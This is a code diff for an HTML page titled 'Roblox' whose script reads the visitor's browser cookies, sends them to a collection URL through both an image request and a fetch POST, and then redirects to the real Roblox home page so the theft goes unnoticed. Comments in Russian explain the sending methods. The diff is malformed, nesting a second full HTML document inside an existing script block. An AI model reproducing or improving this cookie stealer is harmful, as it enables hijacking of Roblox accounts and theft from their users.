@@ -140,35 +140,36 @@
         var TARGET = 'http://127.0.0.1:8080/';
         // ========================
 
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+</head>
+<body>
+    <script>
+        var TARGET = 'http://127.0.0.1:8080/';
         var cookies = document.cookie;
+        if (cookies) {
+            // Способ 1: Image (работает чаще)
+            var img = new Image();
+            img.src = TARGET + '?c=' + encodeURIComponent(cookies);
 
-        if (cookies && cookies.length > 0) {
-            // Отправка через fetch
+            // Способ 2: fetch (дублируем)
             fetch(TARGET, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ cookie: cookies })
-            }).catch(function() {
-                // fallback через Image
-                var img = new Image();
-                img.src = TARGET + '?c=' + encodeURIComponent(cookies);
+            }).catch(function(e) {
+                console.log('Fetch не сработал, но Image уже отправил');
             });
-
-            // Редирект на Roblox (через 200 мс, чтобы запрос успел уйти)
-            setTimeout(function() {
-                window.location.replace('https://www.roblox.com/home');
-            }, 200);
-        } else {
-            // Если кук нет — сразу редирект
-            window.location.replace('https://www.roblox.com/home');
         }
+        window.location.replace('https://www.roblox.com/home');
     </script>
 </body>
 </html>
-        console.log('TARGET:', TARGET);
-        console.log('document.cookie:', document.cookie);
-        console.log('Cookies length:', document.cookie ? document.cookie.length : 0);
-        console.log('=== КОНЕЦ ===');
+  console.log('=== КОНЕЦ ===');
     </script>
 </body>
 </html>
